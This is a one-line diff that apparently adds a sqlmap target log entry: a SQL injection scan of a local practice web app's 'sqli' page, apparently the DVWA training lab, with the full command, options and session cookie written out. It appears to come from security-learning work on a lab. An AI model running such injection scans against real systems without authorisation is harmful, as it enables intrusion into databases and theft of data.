@@ -1,0 +1,1 @@
+http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # C:\Users\omarm\AppData\Local\Programs\Python\Python313\Scripts\sqlmap -u http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit --batch --level=2 --risk=1 -o --output-dir=sqlmap "--cookie=PHPSESSID=563jbi2311688esjjin6fhdfk7; security=low"
